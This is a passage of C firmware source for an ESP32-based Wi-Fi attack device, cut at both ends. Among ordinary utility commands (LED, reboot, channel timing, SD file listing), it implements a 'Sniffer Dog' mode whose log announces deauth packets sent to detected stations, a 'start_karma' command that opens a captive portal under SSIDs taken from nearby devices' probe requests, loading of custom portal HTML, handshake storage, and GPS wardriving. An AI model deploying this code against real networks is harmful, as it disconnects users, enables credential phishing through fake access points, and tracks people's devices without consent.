        printf("%s, CH%d: %d\n", ap->ssid, ap->channel, ap->client_count);
        
        // Print each client MAC on a separate line with 1 space indentation
        if (ap->client_count > 0) {
            for (int j = 0; j < ap->client_count; j++) {
                sniffer_client_t *client = &ap->clients[j];
                printf(" %02X:%02X:%02X:%02X:%02X:%02X\n",
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(20)); // Small delay to avoid overwhelming UART
    }
    
    if (displayed_count == 0) {
        MY_LOG_INFO(TAG, "No APs with clients found.");
    }
    
    return 0;
}

static int cmd_show_probes(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Probe requests: %d", probe_request_count);
    
    // Display each probe request: SSID (MAC)
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        printf("%s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
               probe->ssid,
               probe->mac[0], probe->mac[1], probe->mac[2],
               probe->mac[3], probe->mac[4], probe->mac[5]);
        
        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
    }
    
    return 0;
}

static int cmd_list_probes(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    int unique_count = 0;
    
    // Display each unique SSID only once
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        
        // Check if this SSID has already been displayed by looking at previous entries
        bool already_displayed = false;
        for (int j = 0; j < i; j++) {
            if (strcmp(probe->ssid, probe_requests[j].ssid) == 0) {
                already_displayed = true;
                break;
            }
        }
        
        // If not displayed yet, display it
        if (!already_displayed) {
            unique_count++;
            printf("%d %s\n", unique_count, probe->ssid);
            
            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
        }
    }
    
    return 0;
}

static int cmd_sniffer_debug(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Current sniffer debug mode: %s", sniff_debug ? "ON" : "OFF");
        MY_LOG_INFO(TAG, "Usage: sniffer_debug <0|1>");
        MY_LOG_INFO(TAG, "  0 = disable debug logging");
        MY_LOG_INFO(TAG, "  1 = enable debug logging");
        return 0;
    }
    
    int new_debug = atoi(argv[1]);
    if (new_debug != 0 && new_debug != 1) {
        MY_LOG_INFO(TAG, "Invalid value. Use 0 (disable) or 1 (enable)");
        return 1;
    }
    
    sniff_debug = new_debug;
    MY_LOG_INFO(TAG, "Sniffer debug mode %s", sniff_debug ? "ENABLED" : "DISABLED");
    
    if (sniff_debug) {
        MY_LOG_INFO(TAG, "Debug logging will show detailed packet analysis:");
        MY_LOG_INFO(TAG, "- Packet type, length, channel, RSSI");
        MY_LOG_INFO(TAG, "- All MAC addresses in packet");
        MY_LOG_INFO(TAG, "- AP matching process");
        MY_LOG_INFO(TAG, "- Reason for packet acceptance/rejection");
    }
    
    return 0;
}

static int cmd_start_sniffer_dog(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer Dog already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Regular sniffer is active. Use 'stop' to stop it first.");
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Starting Sniffer Dog mode...");
    
    // Activate sniffer_dog
    sniffer_dog_active = true;
    
    // Set LED to red (aggressive mode)
    esp_err_t led_err = led_set_color(255, 0, 0); // Red
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for Sniffer Dog: %s", esp_err_to_name(led_err));
    }
    
    // Set promiscuous filter
    esp_wifi_set_promiscuous_filter(&sniffer_filter);
    
    // Enable promiscuous mode with sniffer_dog callback
    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize dual-band channel hopping
    sniffer_dog_channel_index = 0;
    sniffer_dog_current_channel = dual_band_channels[0];
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Create channel hopping task
    BaseType_t task_created = xTaskCreate(
        sniffer_dog_task,
        "sniffer_dog",
        4096,
        NULL,
        5,
        &sniffer_dog_task_handle
    );
    
    if (task_created != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create Sniffer Dog channel hopping task");
        sniffer_dog_active = false;
        esp_wifi_set_promiscuous(false);
        
        // Return LED to idle
        led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after Sniffer Dog failure: %s", esp_err_to_name(led_err));
        }
        
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Sniffer Dog started - hunting for AP-STA pairs...");
    MY_LOG_INFO(TAG, "Deauth packets will be sent to detected stations.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop.");
    
    return 0;
}

static int cmd_download(int argc, char **argv) {
    (void)argc;
    (void)argv;

#if HAS_RTC_CNTL_REG && defined(RTC_CNTL_OPTION1_REG) && defined(RTC_CNTL_FORCE_DOWNLOAD_BOOT)
    MY_LOG_INFO(TAG, "Preparing to enter UART download mode. Stopping tasks...");
    (void)cmd_stop(0, NULL);

    // Give Wi-Fi stack a moment to settle before rebooting
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Force next boot into the ROM download (serial flashing) mode
    REG_WRITE(RTC_CNTL_OPTION1_REG, RTC_CNTL_FORCE_DOWNLOAD_BOOT);
#if defined(RTC_CNTL_SW_CPU_STALL_REG)
    REG_WRITE(RTC_CNTL_SW_CPU_STALL_REG, 0);
#endif
    MY_LOG_INFO(TAG, "Rebooting into download mode. Connect via UART/USB-UART bridge to flash.");
    esp_rom_software_reset_system();

    // Should never reach here
    return 0;
#elif HAS_LP_AON_REG && defined(LP_AON_SYS_CFG_REG) && defined(LP_AON_FORCE_DOWNLOAD_BOOT) && defined(LP_AON_FORCE_DOWNLOAD_BOOT_S) && defined(LP_AON_FORCE_DOWNLOAD_BOOT_M)
    MY_LOG_INFO(TAG, "Preparing to enter UART/USB download mode (LP AON). Stopping tasks...");
    (void)cmd_stop(0, NULL);

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Set LP_AON_FORCE_DOWNLOAD_BOOT to 01 (boot0 download)
    uint32_t cfg = REG_READ(LP_AON_SYS_CFG_REG);
    cfg &= ~LP_AON_FORCE_DOWNLOAD_BOOT_M;
    cfg |= (1U << LP_AON_FORCE_DOWNLOAD_BOOT_S);
    REG_WRITE(LP_AON_SYS_CFG_REG, cfg);

    MY_LOG_INFO(TAG, "Rebooting into download mode (LP AON). Connect via UART/USB-UART bridge to flash.");
    esp_rom_software_reset_system();
    return 0;
#else
    MY_LOG_INFO(TAG, "Download mode forcing not supported on this target/SDK.");
    return 1;
#endif
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG,"Restart...");
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
    return 0;
}

static int cmd_ping(int argc, char **argv) {
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG, "pong");
    return 0;
}

static int cmd_led(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: led set <on|off>");
            return 1;
        }

        if (strcasecmp(argv[2], "on") == 0) {
            esp_err_t err = led_set_enabled(true);
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to enable LED: %s", esp_err_to_name(err));
                return 1;
            }
            led_persist_state();
            MY_LOG_INFO(TAG, "LED turned on (brightness %u%%)", led_brightness_percent);
            return 0;
        } else if (strcasecmp(argv[2], "off") == 0) {
            esp_err_t err = led_set_enabled(false);
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to disable LED: %s", esp_err_to_name(err));
                return 1;
            }
            led_persist_state();
            MY_LOG_INFO(TAG, "LED turned off (previous brightness %u%% stored)", led_brightness_percent);
            return 0;
        }

        MY_LOG_INFO(TAG, "Usage: led set <on|off>");
        return 1;
    }

    if (strcasecmp(argv[1], "level") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: led level <1-100>");
            return 1;
        }

        int level = atoi(argv[2]);
        if (level < (int)LED_BRIGHTNESS_MIN || level > (int)LED_BRIGHTNESS_MAX) {
            MY_LOG_INFO(TAG, "Brightness must be between %u and %u", LED_BRIGHTNESS_MIN, LED_BRIGHTNESS_MAX);
            return 1;
        }

        esp_err_t err = led_set_brightness((uint8_t)level);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED brightness: %s", esp_err_to_name(err));
            return 1;
        }
        led_persist_state();

        if (led_is_enabled()) {
            MY_LOG_INFO(TAG, "LED brightness set to %d%%", level);
        } else {
            MY_LOG_INFO(TAG, "LED brightness set to %d%% (LED currently off)", level);
        }
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        MY_LOG_INFO(TAG, "LED status: %s, brightness %u%%", led_is_enabled() ? "on" : "off", led_brightness_percent);
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
    return 1;
}

static int cmd_channel_time(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms> | channel_time read <min|max>");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms>");
            return 1;
        }
        
        int value = atoi(argv[3]);
        if (value < 1 || value > 10000) {
            MY_LOG_INFO(TAG, "Invalid value: %d. Valid range: 1-10000 ms", value);
            return 1;
        }

        if (strcasecmp(argv[2], "min") == 0) {
            g_scan_min_channel_time = (uint32_t)value;
            if (g_scan_min_channel_time > g_scan_max_channel_time) {
                g_scan_max_channel_time = g_scan_min_channel_time;
                MY_LOG_INFO(TAG, "Min channel time set to %u ms (max adjusted to %u ms)", 
                            (unsigned int)g_scan_min_channel_time, (unsigned int)g_scan_max_channel_time);
            } else {
                MY_LOG_INFO(TAG, "Min channel time set to %u ms", (unsigned int)g_scan_min_channel_time);
            }
            channel_time_persist_state();
            return 0;
        } else if (strcasecmp(argv[2], "max") == 0) {
            g_scan_max_channel_time = (uint32_t)value;
            if (g_scan_max_channel_time < g_scan_min_channel_time) {
                g_scan_min_channel_time = g_scan_max_channel_time;
                MY_LOG_INFO(TAG, "Max channel time set to %u ms (min adjusted to %u ms)", 
                            (unsigned int)g_scan_max_channel_time, (unsigned int)g_scan_min_channel_time);
            } else {
                MY_LOG_INFO(TAG, "Max channel time set to %u ms", (unsigned int)g_scan_max_channel_time);
            }
            channel_time_persist_state();
            return 0;
        }
        MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms>");
        return 1;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: channel_time read <min|max>");
            return 1;
        }
        if (strcasecmp(argv[2], "min") == 0) {
            MY_LOG_INFO(TAG, "%u", (unsigned int)g_scan_min_channel_time);
            return 0;
        } else if (strcasecmp(argv[2], "max") == 0) {
            MY_LOG_INFO(TAG, "%u", (unsigned int)g_scan_max_channel_time);
            return 0;
        }
        MY_LOG_INFO(TAG, "Usage: channel_time read <min|max>");
        return 1;
    }

    MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms> | channel_time read <min|max>");
    return 1;
}

static boot_action_config_t* boot_get_action_slot(const char* which) {
    if (which == NULL) {
        return NULL;
    }
    if (strcasecmp(which, "short") == 0) {
        return &boot_config.short_press;
    }
    if (strcasecmp(which, "long") == 0) {
        return &boot_config.long_press;
    }
    return NULL;
}

static int cmd_boot_button(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: boot_button read | boot_button list | boot_button set <short|long> <command> | boot_button status <short|long> <on|off>");
        return 1;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        boot_config_print();
        return 0;
    }

    if (strcasecmp(argv[1], "list") == 0) {
        boot_list_allowed_commands();
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: boot_button set <short|long> <command>");
            boot_list_allowed_commands();
            return 1;
        }
        boot_action_config_t* slot = boot_get_action_slot(argv[2]);
        if (slot == NULL) {
            MY_LOG_INFO(TAG, "Unknown target '%s' (use short|long)", argv[2]);
            return 1;
        }
        if (!boot_is_command_allowed(argv[3])) {
            MY_LOG_INFO(TAG, "Command '%s' not allowed", argv[3]);
            boot_list_allowed_commands();
            return 1;
        }
        strlcpy(slot->command, argv[3], sizeof(slot->command));
        boot_config_persist();
        boot_config_print();
        return 0;
    }

    if (strcasecmp(argv[1], "status") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: boot_button status <short|long> <on|off>");
            return 1;
        }
        boot_action_config_t* slot = boot_get_action_slot(argv[2]);
        if (slot == NULL) {
            MY_LOG_INFO(TAG, "Unknown target '%s' (use short|long)", argv[2]);
            return 1;
        }
        if (strcasecmp(argv[3], "on") == 0) {
            slot->enabled = true;
        } else if (strcasecmp(argv[3], "off") == 0) {
            slot->enabled = false;
        } else {
            MY_LOG_INFO(TAG, "Status must be on|off");
            return 1;
        }
        boot_config_persist();
        boot_config_print();
        return 0;
    }

    MY_LOG_INFO(TAG, "Unknown subcommand. Use: read | list | set | status");
    return 1;
}

static int cmd_vendor(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: vendor set <on|off> | vendor read");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: vendor set <on|off>");
            return 1;
        }

        bool enable;
        if (strcasecmp(argv[2], "on") == 0) {
            enable = true;
        } else if (strcasecmp(argv[2], "off") == 0) {
            enable = false;
        } else {
            MY_LOG_INFO(TAG, "Usage: vendor set <on|off>");
            return 1;
        }

        vendor_set_enabled(enable);
        if (enable && sd_card_mounted) {
            ensure_vendor_file_checked();
        }

        MY_LOG_INFO(TAG, "Vendor scan: %s", vendor_is_enabled() ? "on" : "off");
        if (vendor_is_enabled()) {
            if (!sd_card_mounted) {
                MY_LOG_INFO(TAG, "Vendor file: waiting for SD card");
            } else {
                MY_LOG_INFO(TAG, "Vendor file: %s (%u entries)",
                            vendor_file_present ? "available" : "missing",
                            (unsigned int)vendor_record_count);
            }
        }
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (vendor_is_enabled() && sd_card_mounted) {
            ensure_vendor_file_checked();
        }
        MY_LOG_INFO(TAG, "Vendor scan: %s", vendor_is_enabled() ? "on" : "off");
        if (vendor_is_enabled()) {
            if (!sd_card_mounted) {
                MY_LOG_INFO(TAG, "Vendor file: waiting for SD card");
            } else {
                MY_LOG_INFO(TAG, "Vendor file: %s (%u entries)",
                            vendor_file_present ? "available" : "missing",
                            (unsigned int)vendor_record_count);
            }
        }
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: vendor set <on|off> | vendor read");
    return 1;
}

// Command: start_karma - Starts portal with SSID from probe list
static int cmd_start_karma(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_karma <index>");
        MY_LOG_INFO(TAG, "Example: start_karma 2");
        MY_LOG_INFO(TAG, "Use 'list_probes' to see available SSIDs with their indexes");
        return 1;
    }
    
    // Check if we have any probes captured
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data first.");
        return 1;
    }
    
    // Parse the index argument
    int index = atoi(argv[1]);
    
    // Validate index (1-based for user, 0-based internally)
    if (index < 1 || index > probe_request_count) {
        MY_LOG_INFO(TAG, "Invalid index %d. Valid range: 1-%d", index, probe_request_count);
        MY_LOG_INFO(TAG, "Use 'list_probes' to see available indexes");
        return 1;
    }
    
    // Convert to 0-based index
    int probe_index = index - 1;
    
    // Get the SSID from the probe request
    char *selected_ssid = probe_requests[probe_index].ssid;
    
    MY_LOG_INFO(TAG, "Starting Karma attack with SSID: %s", selected_ssid);
    
    // Prepare arguments for cmd_start_portal
    char *portal_argv[2];
    portal_argv[0] = "start_portal";
    portal_argv[1] = selected_ssid;
    
    // Call cmd_start_portal with the selected SSID
    return cmd_start_portal(2, portal_argv);
}

// Load preset SSIDs from /sdcard/lab/ssid.txt
static int load_ssid_presets(char ssids[][MAX_SSID_NAME_LEN + 1], int max_entries) {
    if (max_entries <= 0) {
        return 0;
    }

    FILE *f = fopen(SSID_PRESET_PATH, "r");
    if (f == NULL) {
        return -1;
    }

    char line[96];
    int count = 0;
    while ((count < max_entries) && fgets(line, sizeof(line), f)) {
        char *start = line;
        while (*start && isspace((unsigned char)*start)) {
            start++;
        }
        if (*start == '\0') {
            continue;
        }
        char *end = start + strlen(start);
        while (end > start && (end[-1] == '\n' || end[-1] == '\r')) {
            *--end = '\0';
        }
        while (end > start && isspace((unsigned char)end[-1])) {
            *--end = '\0';
        }
        if (*start == '\0') {
            continue;
        }
        size_t len = strlen(start);
        if (len > MAX_SSID_NAME_LEN) {
            start[MAX_SSID_NAME_LEN] = '\0';
        }
        strncpy(ssids[count], start, MAX_SSID_NAME_LEN);
        ssids[count][MAX_SSID_NAME_LEN] = '\0';
        count++;
    }

    fclose(f);
    return count;
}

static void report_ssid_file_status(void) {
    char ssids[MAX_SSID_PRESETS][MAX_SSID_NAME_LEN + 1];
    int count = load_ssid_presets(ssids, MAX_SSID_PRESETS);
    if (count < 0) {
        MY_LOG_INFO(TAG, "ssid.txt not found - manual SSID entry only");
        return;
    }
    MY_LOG_INFO(TAG, "ssid.txt found with %d preset SSID(s)", count);
}

// Command: list_ssid - Lists SSIDs from ssid.txt on SD card
static int cmd_list_ssid(int argc, char **argv)
{
    (void)argc; (void)argv;

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }

    char ssids[MAX_SSID_PRESETS][MAX_SSID_NAME_LEN + 1];
    int count = load_ssid_presets(ssids, MAX_SSID_PRESETS);
    if (count < 0) {
        MY_LOG_INFO(TAG, "ssid.txt not found on SD card.");
        return 0;
    }

    if (count == 0) {
        MY_LOG_INFO(TAG, "ssid.txt is empty - manual SSID entry only.");
        return 0;
    }

    MY_LOG_INFO(TAG, "SSID presets from ssid.txt:");
    for (int i = 0; i < count; i++) {
        printf("%d %s\n", i + 1, ssids[i]);
    }

    return 0;
}

// Command: list_sd - Lists HTML files on SD card
static int cmd_list_sd(int argc, char **argv)
{
    (void)argc; (void)argv;
    
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }
    
    DIR *dir = opendir("/sdcard/lab/htmls");
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/htmls directory. Error: %d (%s)", errno, strerror(errno));
        return 1;
    }
    
    sd_html_count = 0;
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL && sd_html_count < MAX_HTML_FILES) {
        // Skip directories and special entries
        if (entry->d_type == DT_DIR) {
            continue;
        }
        
        // Skip macOS metadata files (._filename or _filename in MS-DOS 8.3)
        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
            continue;
        }
        
        // Check if file ends with .html or .htm (case insensitive)
        size_t len = strlen(entry->d_name);
        bool is_html = false;
        
        if (len > 5) {
            const char *ext = entry->d_name + len - 5;
            if (strcasecmp(ext, ".html") == 0) {
                is_html = true;
            }
        }
        
        if (!is_html && len > 4) {
            const char *ext = entry->d_name + len - 4;
            if (strcasecmp(ext, ".htm") == 0) {
                is_html = true;
            }
        }
        
        if (is_html) {
            strncpy(sd_html_files[sd_html_count], entry->d_name, MAX_HTML_FILENAME - 1);
            sd_html_files[sd_html_count][MAX_HTML_FILENAME - 1] = '\0';
            sd_html_count++;
        }
    }
    
    closedir(dir);
    
    if (sd_html_count == 0) {
        MY_LOG_INFO(TAG, "No HTML files found on SD card.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "HTML files found on SD card:");
    for (int i = 0; i < sd_html_count; i++) {
        printf("%d %s\n", i + 1, sd_html_files[i]);
    }
    
    return 0;
}

static bool build_sd_path(char *dest, size_t dest_size, const char *input_path)
{
    if (!dest || dest_size == 0 || !input_path || input_path[0] == '\0') {
        return false;
    }

    if (input_path[0] == '/') {
        strncpy(dest, input_path, dest_size - 1);
        dest[dest_size - 1] = '\0';
    } else {
        snprintf(dest, dest_size, "/sdcard/%s", input_path);
    }

    size_t len = strlen(dest);
    while (len > 1 && dest[len - 1] == '/') {
        dest[--len] = '\0';
    }

    return dest[0] != '\0';
}

// Command: list_dir [path] - Lists files inside a directory on SD card
static int cmd_list_dir(int argc, char **argv)
{
    const char *input_path = (argc >= 2) ? argv[1] : "lab/handshakes";
    char full_path[SD_PATH_MAX];

    if (!build_sd_path(full_path, sizeof(full_path), input_path)) {
        MY_LOG_INFO(TAG, "Invalid path provided.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    DIR *dir = opendir(full_path);
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open %s. Error: %d (%s)", full_path, errno, strerror(errno));
        return 1;
    }

    MY_LOG_INFO(TAG, "Files in %s:", full_path);

    struct dirent *entry;
    int file_count = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
            continue;
        }
        file_count++;
        printf("%d %s\n", file_count, entry->d_name);
    }

    closedir(dir);

    if (file_count == 0) {
        MY_LOG_INFO(TAG, "No files found in %s", full_path);
    } else {
        MY_LOG_INFO(TAG, "Found %d file(s) in %s", file_count, full_path);
    }

    return 0;
}

// Command: file_delete <path> - Deletes a file on SD card
static int cmd_file_delete(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: file_delete <path>");
        MY_LOG_INFO(TAG, "Example: file_delete lab/handshakes/sample.pcap");
        return 1;
    }

    char full_path[SD_PATH_MAX];
    if (!build_sd_path(full_path, sizeof(full_path), argv[1])) {
        MY_LOG_INFO(TAG, "Invalid path provided.");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    struct stat st;
    if (stat(full_path, &st) != 0) {
        MY_LOG_INFO(TAG, "File not found: %s (errno: %d)", full_path, errno);
        return 1;
    }

    if (S_ISDIR(st.st_mode)) {
        MY_LOG_INFO(TAG, "Refusing to delete directory: %s", full_path);
        return 1;
    }

    if (unlink(full_path) != 0) {
        MY_LOG_INFO(TAG, "Failed to delete %s: %s", full_path, strerror(errno));
        return 1;
    }

    MY_LOG_INFO(TAG, "Deleted %s", full_path);
    return 0;
}

// Command: select_html [index] - Loads HTML file from SD card
static int cmd_select_html(int argc, char **argv)
{
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: select_html <index>");
        MY_LOG_INFO(TAG, "Run list_sd first to see available HTML files.");
        return 1;
    }
    
    int index = atoi(argv[1]) - 1; // Convert from 1-based to 0-based
    
    if (index < 0 || index >= sd_html_count) {
        MY_LOG_INFO(TAG, "Invalid index. Run list_sd to see available files.");
        return 1;
    }
    
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
        return 1;
    }
    
    char filepath[128];
    snprintf(filepath, sizeof(filepath), "/sdcard/lab/htmls/%s", sd_html_files[index]);
    
    // Open file and get size
    FILE *f = fopen(filepath, "r");
    if (f == NULL) {
        MY_LOG_INFO(TAG, "Failed to open file: %s", filepath);
        return 1;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (fsize <= 0 || fsize > 800000) { // Limit to 800KB
        MY_LOG_INFO(TAG, "File size invalid or too large: %ld bytes", fsize);
        fclose(f);
        return 1;
    }
    
    // Free previous custom HTML if exists
    if (custom_portal_html != NULL) {
        free(custom_portal_html);
        custom_portal_html = NULL;
    }
    
    // Allocate memory and read file
    custom_portal_html = (char*)malloc(fsize + 1);
    if (custom_portal_html == NULL) {
        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML file.");
        fclose(f);
        return 1;
    }
    
    size_t bytes_read = fread(custom_portal_html, 1, fsize, f);
    custom_portal_html[bytes_read] = '\0';
    fclose(f);
    
    MY_LOG_INFO(TAG, "Loaded HTML file: %s (%u bytes)", sd_html_files[index], (unsigned int)bytes_read);
    MY_LOG_INFO(TAG, "Portal will now use this custom HTML.");
    
    return 0;
}

// Wardrive task function (runs in background)
static void wardrive_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Wardrive task started.");
    
    // Set LED to indicate wardrive mode
    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for wardrive: %s", esp_err_to_name(led_err));
    }
    
    // Find the next file number by scanning existing files
    wardrive_file_counter = find_next_wardrive_file_number();
    MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.log", wardrive_file_counter);
    
    // Wait for GPS fix before starting
    MY_LOG_INFO(TAG, "Waiting for GPS fix...");
    if (!wait_for_gps_fix(120)) {  // Wait up to 120 seconds for GPS fix
        MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, not continuing without GPS data - please ensure clear view of the sky and try again.");
        operation_stop_requested = true;
    } else {
        MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f", 
                   current_gps.latitude, current_gps.longitude);
    }
    
    MY_LOG_INFO(TAG, "Wardrive started. Use 'stop' command to stop.");
    
    // Main wardrive loop (runs until user stops)
    int scan_counter = 0;
    while (wardrive_active && !operation_stop_requested) {
        // Check for stop request at the beginning of loop
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            operation_stop_requested = false;
            wardrive_active = false;
            break;
        }
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm", 
                               current_gps.latitude, current_gps.longitude, 
                               current_gps.altitude, current_gps.accuracy);
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        // Scan WiFi networks
        wifi_scan_config_t scan_cfg = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 120,
            .scan_time.active.max = 700,
        };
        
        // Perform blocking scan to ensure results are ready before logging
        if (operation_stop_requested) {
            break;
        }
        esp_err_t scan_err = esp_wifi_scan_start(&scan_cfg, true);
        if (scan_err != ESP_OK) {
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }
        
        // If driver reported failure or no results, try a blocking fallback scan
        uint16_t scan_count = 0;
        esp_wifi_scan_get_ap_num(&scan_count);
        if ((scan_count == 0) || (g_last_scan_status != 0)) {
            wifi_scan_config_t fb_cfg = scan_cfg;
            fb_cfg.scan_time.active.min = 120;
            fb_cfg.scan_time.active.max = 700;
            esp_err_t fb = esp_wifi_scan_start(&fb_cfg, true); // blocking
            if (fb != ESP_OK) {
                continue;
            }
            scan_count = MAX_AP_CNT;
            esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        } else {
            scan_count = MAX_AP_CNT;
            esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        }

        // If still no records, fall back to the buffer populated by the event handler
        if (scan_count == 0 && g_scan_count > 0) {
            if (g_scan_count > MAX_AP_CNT) {
                scan_count = MAX_AP_CNT;
            } else {
                scan_count = g_scan_count;
            }
            memcpy(wardrive_scan_results, g_scan_results, scan_count * sizeof(wifi_ap_record_t));
        }

        MY_LOG_INFO(TAG, "Wardrive: scan_count=%u (status=%" PRIu32 ")", scan_count, g_last_scan_status);
        
        // Create filename (keep it simple for FAT filesystem)
        char filename[64];
        snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
        
        // Check if /sdcard/lab/wardrives directory is accessible
        struct stat st;
        if (stat("/sdcard/lab/wardrives", &st) != 0) {
